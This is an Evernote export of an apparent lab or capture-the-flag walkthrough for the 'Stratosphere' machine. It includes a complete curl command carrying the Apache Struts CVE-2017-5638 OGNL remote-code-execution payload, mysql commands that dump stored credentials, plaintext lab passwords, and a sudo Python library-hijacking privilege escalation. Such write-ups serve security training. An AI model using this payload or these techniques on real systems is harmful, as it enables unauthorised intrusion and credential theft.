<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/><meta name="exporter-version" content="Evernote Mac 7.8 (457454)"/><meta name="author" content="mcivor88@me.com"/><meta name="created" content="2018-08-10 12:04:01 +0000"/><meta name="source" content="desktop.mac"/><meta name="updated" content="2018-08-18 09:46:24 +0000"/><title>Stratosphere</title></head><body><div>Nmap scan shows:</div><ul><li><div>22 ssh</div></li><li><div>80 Apache </div></li><li><div>8080 Apache </div></li></ul><div><img src="Stratosphere.html.resources/Screen%20Shot%202018-08-10%20at%2023.13.45.png" height="552" width="1132"/><br/></div><div><br/></div><div>Dirbuster on port 80 Apache instance (initial run showed no results, reran with medium wordlist and discovered the following)</div><div> <img src="Stratosphere.html.resources/Screen%20Shot%202018-08-11%20at%2017.44.39.png" height="706" width="1574"/><br/></div><div><br/></div><div>All /manager/ paths require authentication to the server however the /Monitoring path shows us a unauthenticated page with a new vector</div><div><br/></div><div>Exploring the new URL we can see the following pages:</div><ul><li><div>Login_input.action</div></li><li><div>Register.action</div></li></ul><div><img src="Stratosphere.html.resources/Screen%20Shot%202018-08-11%20at%2018.15.37.png" height="948" width="1610"/><br/></div><div><br/></div><div>Register.action leads to a parked page as the functionality is not yet implemented.</div><div><br/></div><div>Login_intput.action is a fully functional login form which leads to the Login.action </div><div><img src="Stratosphere.html.resources/Screen%20Shot%202018-08-11%20at%2018.19.06.png" height="1250" width="2654"/><br/></div><div><br/></div><div><br/></div><div>Quick googling of .action files tells that these are Apache Struts based, which based on further googling gives us several CVE’s from last year which were high (10 CVSS) vulnerabilities with RCE.</div><div><br/></div><div><br/></div><div>Taking CVE-2017-5638, a java deserialisation vulnerability we can test this Login.action form for RCE.</div><div><br/></div><div>"<b style="background-color: rgb(255, 250, 165);-evernote-highlight:true;">curl -i -v -s -k  -X $'GET'    -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:51.0) Gecko/20100101 Firefox/51.0' -H $'Content-Type:%{(#nike=\'multipart/form-data\').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[\'com.opensymphony.xwork2.ActionContext.container\']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=\’ls -la /home\').(#iswin=(@java.lang.System@getProperty(\'os.name\').toLowerCase().contains(\'win\'))).(#cmds=(#iswin?{\'cmd.exe\',\'/c\',#cmd}:{\'/bin/bash\',\'-c\',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@<a href="http://org.apache.commons.io.IOUtils@copy(#process.getInputStream">org.apache.commons.io.IOUtils@copy(#process.getInputStream</a>(),#ros)).(#ros.flush())}' \   $'<a href="http://10.10.36.22:8080/struts2-blank/example/HelloWorld.action">http://10.10.36.22:8080/Monitoring/example/Login.action</a></b>’"</div><div><br/></div><div>And we see that we have success:</div><div><img src="Stratosphere.html.resources/Screen%20Shot%202018-08-15%20at%2018.27.17.png" height="626" width="1104"/><br/></div><div><br/></div><div>Now we have to try and escalate to Richard and then root.</div><div><br/></div><div><span style="font-size: 24px; font-weight: bold; text-decoration: underline;">Privilege Escalation</span></div><div><br/></div><div>Not many services stand out running under root and none as user Richard</div><div>Sudo abuse looks like it is not possible </div><div>Basic searching for stored credentials throws up some results:</div><ul><li><div>Recursive search in current www directory for “richard” shows no results</div></li><li><div>Recursive search in www directory (“<span style="background-color: rgb(255, 250, 165); font-style: italic; font-weight: bold;-evernote-highlight:true;">grep -ilr admin ./</span>“) shows two files:</div></li><ul><li><div>db_connect</div></li><li><div>policy/catalina.policy</div></li></ul><li><div>Viewing the contents of the file “<span style="font-style: italic; font-weight: bold;">db_connect</span>”:</div></li><li><div><div><img src="Stratosphere.html.resources/Screen%20Shot%202018-08-15%20at%2018.58.36.png" height="710" width="466"/></div></div></li></ul><div><br/></div><div>Since these are db credentials we search again in the list of processes for the sql but not necessarily run by root:</div><div><img src="Stratosphere.html.resources/Screen%20Shot%202018-08-15%20at%2019.07.17.png" height="68" width="1488"/><br/></div><div><br/></div><div>Now we can try to connect to the db for further enumeration:</div><ul><li><div>"<span style="background-color: rgb(255, 250, 165); font-weight: bold;-evernote-highlight:true;">mysql -u ssn_admin —password=AWs64@on*&amp;</span>” give us auth error</div></li><ul><li><div><div><img src="Stratosphere.html.resources/Screen%20Shot%202018-08-15%20at%2019.33.30.png" height="138" width="1506"/></div></div></li></ul><li><div>"<span style="background-color: rgb(255, 250, 165); font-weight: bold;-evernote-highlight:true;">mysql -u admin —password=admin</span>” give us auth <span style="background-color: rgb(255, 250, 165); font-weight: bold;-evernote-highlight:true;">success</span></div></li></ul><div>We can now try to execute commands against the db:</div><ul><li><div>Start by trying to view table structure: ‘select * from sys.tables’ -&gt; denied</div></li><li><div>Let’s try to view more general details:</div></li><ul><li><div><span style="background-color: rgb(255, 250, 165); font-weight: bold;-evernote-highlight:true;">mysql --user=admin -padmin -e "show databases"</span></div></li><li><div>Shows 2 databases:</div></li><ul><li><div>information_schema</div></li><li><div>users</div></li></ul></ul><li><div>Let’s try to view tables:</div></li><ul><li><div><span style="background-color: rgb(255, 250, 165); font-weight: bold;-evernote-highlight:true;">mysql --user=admin -padmin --e "use information_schema; show tables"</span></div></li><ul><li><div><span style="background-color: rgb(255, 250, 165);-evernote-highlight:true;"><span style="background-color: rgb(255, 250, 165); font-weight: bold;-evernote-highlight:true;">Gives loads of results -&gt; come back to this</span></span></div></li></ul><li><div><span style="background-color: rgb(255, 250, 165); font-weight: bold;-evernote-highlight:true;">mysql --user=admin -padmin --e "use users; show tables"</span></div></li><ul><li><div>Gives us table called “accounts"</div></li><li><div><div><img src="Stratosphere.html.resources/Screen%20Shot%202018-08-15%20at%2019.43.59.png" height="210" width="652"/></div></div></li></ul><li><div><span style="background-color: rgb(255, 255, 255);"><span style="background-color: rgb(255, 255, 255); font-weight: bold;">D</span><span style="background-color: rgb(255, 255, 255); font-weight: bold;">ump the accounts table:</span></span></div></li><ul><li><div><span style="background-color: rgb(255, 250, 165);-evernote-highlight:true;"><span style="background-color: rgb(255, 250, 165); font-weight: bold;-evernote-highlight:true;">mysql --user=admin -padmin --e “select * from users.accounts"</span></span></div></li><li><div><div><span style="background-color: rgb(255, 250, 165);-evernote-highlight:true;"><b><img src="Stratosphere.html.resources/Screen%20Shot%202018-08-15%20at%2019.46.38.png" height="136" width="1160"/></b></span></div></div></li></ul></ul></ul><div><span style="font-weight: bold;">This now looks to be a password hash, lets run this through John the ripper or Hashcat:</span></div><div><br/></div><div>"9tc*rhKuG5TyXvUJOrE^5CK7k”</div><div><br/></div><div>Analysis through several tools show that this is not a valid hash, been overthinking it and it is actually a password for Richard!</div><div><img src="Stratosphere.html.resources/Screen%20Shot%202018-08-15%20at%2020.03.03.png" height="624" width="2824"/><br/></div><div>             </div><div>  Now we need to escalate privileges to root:</div><div><br/></div><div>We have a “test.py” file in richards home dir</div><div><img src="Stratosphere.html.resources/Screen%20Shot%202018-08-15%20at%2023.24.46.png" height="1492" width="1852"/>           </div><div> Looks like cracking hashes will result in running “/root/success.py”</div><div><br/></div><div>First hashes (MD5, SHA1, MD4) are outdated and easily cracked but Blake2b is not (it was a SHA3 finalist!!)</div><div><br/></div><div>Let’s look else where turning to normal priv esc techniques:</div><ul><li><div>There are several world writable files</div></li><li><div>Sudo abuse may be possible</div></li></ul><div><br/></div><div>Checking sudo commands shows:</div><div><img src="Stratosphere.html.resources/Screen%20Shot%202018-08-15%20at%2023.28.53.png" height="280" width="1478"/><br/></div><div>So richard should be able to run python as sudo, game over!</div><div><br/></div><div>NOTE: I could not get sudo to activate properly it was still asking a password, after much head banging it ws due to the absolute syntax of the command listing i.e had to exactly as show</div><div><br/></div><div>"sudo python test.py” -&gt; does not work</div><div>"sudo /usr/bin/python test.py” -&gt; does not work</div><div><span style="background-color: rgb(255, 250, 165); font-weight: bold;-evernote-highlight:true;">"sudo /usr/bin/python2.7 /home/richard/test.py” -&gt; DOES WORK</span></div><div><br/></div><div><span style="font-weight: bold;">Okay so given we can run python as sudo but only the one file and not the interactive python prompt, this means the old way (sudo python -&gt; os.spawn(‘/bin/bash')) is useless.</span></div><div><br/></div><div><span style="font-weight: bold;">Turns out python has a local private esc in library/module hijacking with regards to class path!!</span></div><ul><li><div><span style="font-weight: bold;">Python checks the current dir first and then the standard library dirs in order (same as DLL hijacking etc)</span></div></li><li><div><span style="font-weight: bold;"> if we create our own code and mimic a library, by placing it higher up the check order we can have it executed!</span></div></li></ul><div><a href="https://rastating.github.io/privilege-escalation-via-python-library-hijacking/">https://rastating.github.io/privilege-escalation-via-python-library-hijacking/</a></div><div><br/></div><div>Looking at test.py we see it imports “<span style="font-weight: bold; background-color: rgb(255, 250, 165);-evernote-highlight:true;">hashlib.py</span>”:</div><ul><li><div>    If we create a file named “<span style="font-weight: bold; background-color: rgb(255, 250, 165);-evernote-highlight:true;">hashlib.py</span>” in the same working dir it will be called first </div></li><li><div>Except it will contain our desired code and will be run by sudo</div></li></ul><div><img src="Stratosphere.html.resources/Screen%20Shot%202018-08-15%20at%2023.40.50.png" height="482" width="1274"/><br/></div><div><br/></div></body></html>